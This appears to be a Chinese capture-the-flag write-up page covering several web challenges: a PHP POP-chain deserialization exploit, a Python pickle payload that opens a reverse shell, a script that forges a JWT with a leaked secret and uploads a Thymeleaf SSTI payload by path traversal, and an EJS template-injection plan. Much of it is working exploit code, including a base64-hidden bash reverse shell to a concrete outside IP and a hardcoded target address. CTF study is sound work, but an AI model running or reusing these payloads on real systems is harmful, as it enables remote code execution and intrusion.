+<h3 id="POP链"><a href="#POP链" class="headerlink" title="POP链"></a>POP链</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">H.__destruct-&gt;A.start()-&gt;V.__toString-&gt;E.__get-&gt;F.check()-&gt;(小写u绕过)-&gt;U.__invoke</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$first</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$step</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$next</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">E</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$you</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$found</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$secret</span> = <span class="string">&quot;admin123&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">F</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fifth</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$step</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$finalstep</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">H</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$who</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$are</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$you</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">N</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$congratulation</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$yougotit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">U</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$almost</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$there</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;there = <span class="keyword">new</span> <span class="title function_ invoke__">N</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cmd = <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">V</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$good</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$keep</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dowhat</span> = <span class="string">&quot;secret&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$go</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">H</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;who = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;who-&gt;next = <span class="keyword">new</span> <span class="title function_ invoke__">V</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;who-&gt;next-&gt;go = <span class="keyword">new</span> <span class="title function_ invoke__">E</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;who-&gt;next-&gt;go-&gt;found = <span class="keyword">new</span> <span class="title function_ invoke__">F</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;who-&gt;next-&gt;go-&gt;found-&gt;finalstep = <span class="string">&quot;u&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure></div>
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="../images/image-20251011124713538.png"
+                      alt="image-20251011124713538" style="zoom: 67%;" 
+                >
+
+<h2 id="ez-blog"><a href="#ez-blog" class="headerlink" title="ez_blog"></a>ez_blog</h2><p>弱口令guest&#x2F;guest直接登录</p>
+<p>访问博客文章发现cookie很可疑</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251011153353048.png"
+                      alt="image-20251011153353048"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251011153412121.png"
+                      alt="image-20251011153412121"
+                ></p>
+<p>拿去16进制解码，可看到疑似pickle 序列化的字符</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251011153501285.png"
+                      alt="image-20251011153501285"
+                ></p>
+<p>打pickle反序列化，利用python3反弹shell</p>
+<h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">import</span> subprocess</span><br><span class="line">        <span class="keyword">return</span> (subprocess.call,</span><br><span class="line">                ([<span class="string">&#x27;python3&#x27;</span>,</span><br><span class="line">                  <span class="string">&#x27;-c&#x27;</span>,</span><br><span class="line">                  <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;vps_ip&quot;,port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;sh&quot;)&#x27;</span>],))</span><br><span class="line">data=A()</span><br><span class="line">b=pickle.dumps(data)</span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line"><span class="comment"># 字符串转16进制</span></span><br><span class="line">exp = binascii.hexlify(b).decode()</span><br><span class="line"><span class="built_in">print</span>(exp)</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251011153620342.png"
+                      alt="image-20251011153620342"
+                ></p>
+<h2 id="authweb"><a href="#authweb" class="headerlink" title="authweb"></a>authweb</h2><p>Spring boot Thymeleaf 模板注入，可参考<a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/TT0TT/p/16845759.html" >https://www.cnblogs.com/TT0TT/p/16845759.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;span th:text=&quot;$&#123;7 * 7&#125;&quot;&gt;&lt;/span&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>下载jar包反编译，发现的JWT的secret</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251011175116954.png"
+                      alt="image-20251011175116954"
+                ></p>
+<p>有个文件上传的点，需要进行JWT验证，否则跳转至login</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251011175212815.png"
+                      alt="image-20251011175212815"
+                ></p>
+<p>这里将文件保存到<code>uploadFile</code>目录中，文件名为<code>name + &quot;.html&quot;</code></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251011175224047.png"
+                      alt="image-20251011175224047"
+                ></p>
+<p>注意到<code>/login/dynamic-template</code>端点中，<code>value</code>参数直接拼接到模板名称中。这可能导致服务器端模板注入（SSTI）如果应用程序使用模板引擎（如Thymeleaf）来渲染HTML，且上传文件名无过滤，可进行路径遍历</p>
+<p>flag在环境变量中通过<code>$&#123;@environment.getSystemEnvironment()&#125;</code>获取，通过<code>java.lang.Runtime</code>等命令执行会返回500，应该是被禁了</p>
+<p>思路</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">伪造JWT令牌-&gt;路径穿越上传SSTI payload-&gt;触发SSTI</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标URL（根据实际环境修改）</span></span><br><span class="line">BASE_URL = <span class="string">&quot;http://45.40.247.139:31187&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># JWT密钥（从JwtTokenProvider类中获取）</span></span><br><span class="line">JWT_SECRET = <span class="string">&quot;25d55ad283aa400af464c76d713c07add57f21e6a273781dbf8b7657940f3b03&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_jwt_token</span>(<span class="params">username</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;生成JWT令牌&quot;&quot;&quot;</span></span><br><span class="line">    payload = &#123;</span><br><span class="line">        <span class="string">&quot;sub&quot;</span>: <span class="string">&quot;user1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;iat&quot;</span>: datetime.datetime.utcnow(),</span><br><span class="line">        <span class="string">&quot;exp&quot;</span>: datetime.datetime.utcnow() + datetime.timedelta(hours=<span class="number">1</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    token = jwt.encode(payload, JWT_SECRET.encode(), algorithm=<span class="string">&quot;HS256&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> token</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_ssti_payload</span>(<span class="params">token</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;上传包含SSTI载荷的HTML文件&quot;&quot;&quot;</span></span><br><span class="line">    url = <span class="string">f&quot;<span class="subst">&#123;BASE_URL&#125;</span>/upload&quot;</span></span><br><span class="line">    headers = &#123;<span class="string">&quot;Authorization&quot;</span>: <span class="string">f&quot;Bearer <span class="subst">&#123;token&#125;</span>&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># SSTI载荷：使用Thymeleaf表达式遍历并打印所有环境变量</span></span><br><span class="line">    <span class="comment">#__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22whoami%22).getInputStream()).next()%7d__::.x</span></span><br><span class="line">    ssti_payload = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html xmlns:th=&quot;http://www.thymeleaf.org&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;SSTI Exploit&lt;/title&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">    &lt;h1&gt;Environment Variables:&lt;/h1&gt;</span></span><br><span class="line"><span class="string">    &lt;ul&gt;</span></span><br><span class="line"><span class="string">        &lt;li th:each=&quot;envVar : $&#123;@environment.getSystemEnvironment()&#125;&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;strong th:text=&quot;$&#123;envVar.key&#125;&quot;&gt;Key&lt;/strong&gt;: &lt;span th:text=&quot;$&#123;envVar.value&#125;&quot;&gt;Value&lt;/span&gt;</span></span><br><span class="line"><span class="string">        &lt;/li&gt;</span></span><br><span class="line"><span class="string">    &lt;/ul&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">	shell_payload=<span class="string">&quot;&quot;&quot;$&#123;T(ch.qos.logback.core.util.OptionHelper).instantiateByClassName(&quot;org.springframework.expression.spel.standard.SpelExpressionParser&quot;,&quot;&quot;.getClass().getSuperclass(),T(ch.qos.logback.core.util.OptionHelper).getClassLoader()).parseExpression(&quot;T(java.lang.String).forName(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjAuNDYuMTI4LjIzNi84OTg5IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;)&quot;).getValue()&#125;&quot;&quot;&quot;</span></span><br><span class="line">    </span><br><span class="line">    files = &#123;</span><br><span class="line">        <span class="string">&quot;imgFile&quot;</span>: (<span class="string">&quot;exploit.html&quot;</span>, ssti_payload)</span><br><span class="line">    &#125;</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;imgName&quot;</span>: <span class="string">&quot;../templates/exploit&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    response = requests.post(url, headers=headers, files=files, data=data)</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">trigger_ssti</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;通过动态模板端点触发SSTI&quot;&quot;&quot;</span></span><br><span class="line">    response = requests.get(<span class="string">f&#x27;<span class="subst">&#123;BASE_URL&#125;</span>/login/dynamic-template?value=exploit&#x27;</span>, timeout=<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># 1. 生成管理员JWT令牌</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Generating JWT token for admin...&quot;</span>)</span><br><span class="line">    token = generate_jwt_token(<span class="string">&quot;admin&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] Token: <span class="subst">&#123;token&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2. 上传SSTI载荷</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Uploading SSTI payload...&quot;</span>)</span><br><span class="line">    upload_response = upload_ssti_payload(token)</span><br><span class="line">    <span class="keyword">if</span> upload_response.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] Upload successful&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[-] Upload failed: <span class="subst">&#123;upload_response.status_code&#125;</span> - <span class="subst">&#123;upload_response.text&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3. 触发SSTI并打印环境变量</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Triggering SSTI...&quot;</span>)</span><br><span class="line">    ssti_response = trigger_ssti()</span><br><span class="line">    <span class="keyword">if</span> ssti_response.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] SSTI triggered successfully&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span> + <span class="string">&quot;=&quot;</span> * <span class="number">50</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Environment Variables:&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">50</span>)</span><br><span class="line">        <span class="built_in">print</span>(ssti_response.text)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[-] SSTI failed: <span class="subst">&#123;ssti_response.status_code&#125;</span> - <span class="subst">&#123;ssti_response.text&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></div>
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="../images/image-20251011181540354.png"
+                      alt="image-20251011181540354" style="zoom: 67%;" 
+                >
+
+<h2 id="staticNodeService"><a href="#staticNodeService" class="headerlink" title="staticNodeService"></a>staticNodeService</h2><p>源码</p>
+<div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> ejs = <span class="built_in">require</span>(<span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">PORT</span> = <span class="built_in">parseInt</span>(process.<span class="property">env</span>.<span class="property">PORT</span>) || <span class="number">3000</span>;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">json</span>(&#123;</span><br><span class="line">    <span class="attr">limit</span>: <span class="string">&#x27;1mb&#x27;</span></span><br><span class="line">&#125;));</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">STATIC_DIR</span> = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// serve index for better viewing</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">serveIndex</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> templ = req.<span class="property">query</span>.<span class="property">templ</span> || <span class="string">&#x27;index&#x27;</span>;</span><br><span class="line">    <span class="keyword">var</span> lsPath = path.<span class="title function_">join</span>(__dirname, req.<span class="property">path</span>);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        res.<span class="title function_">render</span>(templ, &#123;</span><br><span class="line">            <span class="attr">filenames</span>: fs.<span class="title function_">readdirSync</span>(lsPath),</span><br><span class="line">            <span class="attr">path</span>: req.<span class="property">path</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(e);</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&#x27;Error rendering page&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// static serve for simply view/download</span></span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">static</span>(<span class="variable constant_">STATIC_DIR</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Security middleware</span></span><br><span class="line">app.<span class="title function_">use</span>(<span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> req.<span class="property">path</span> !== <span class="string">&#x27;string&#x27;</span> || </span><br><span class="line">            (<span class="keyword">typeof</span> req.<span class="property">query</span>.<span class="property">templ</span> !== <span class="string">&#x27;string&#x27;</span> &amp;&amp; <span class="keyword">typeof</span> req.<span class="property">query</span>.<span class="property">templ</span> !== <span class="string">&#x27;undefined&#x27;</span>)</span><br><span class="line">        ) res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&#x27;Error parsing path&#x27;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="regexp">/js$|\.\./i</span>.<span class="title function_">test</span>(req.<span class="property">path</span>)) res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">send</span>(<span class="string">&#x27;Denied filename&#x27;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="title function_">next</span>();</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// logic middleware</span></span><br><span class="line">app.<span class="title function_">use</span>(<span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">path</span>.<span class="title function_">endsWith</span>(<span class="string">&#x27;/&#x27;</span>)) <span class="title function_">serveIndex</span>(req, res);</span><br><span class="line">    <span class="keyword">else</span> <span class="title function_">next</span>();</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Upload operation handler</span></span><br><span class="line">app.<span class="title function_">put</span>(<span class="string">&#x27;/*&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> filePath = path.<span class="title function_">join</span>(<span class="variable constant_">STATIC_DIR</span>, req.<span class="property">path</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fs.<span class="title function_">existsSync</span>(filePath)) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&#x27;File already exists&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fs.<span class="title function_">writeFile</span>(filePath, <span class="title class_">Buffer</span>.<span class="title function_">from</span>(req.<span class="property">body</span>.<span class="property">content</span>, <span class="string">&#x27;base64&#x27;</span>), <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (err) &#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&#x27;Error writing file&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">201</span>).<span class="title function_">send</span>(<span class="string">&#x27;File created/updated&#x27;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Server start</span></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="variable constant_">PORT</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Static server is running on http://localhost:<span class="subst">$&#123;PORT&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></div>
+
+<p>漏洞点主要在<code>serveIndex下的res.render(templ...</code>可以进行模板渲染，渲染的文件名我们是可控的</p>
+<p>思路</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">上传恶意.ejs文件到/views/下 -&gt; /?templ=shell触发EJS注入</span><br></pre></td></tr></table></figure></div>
+
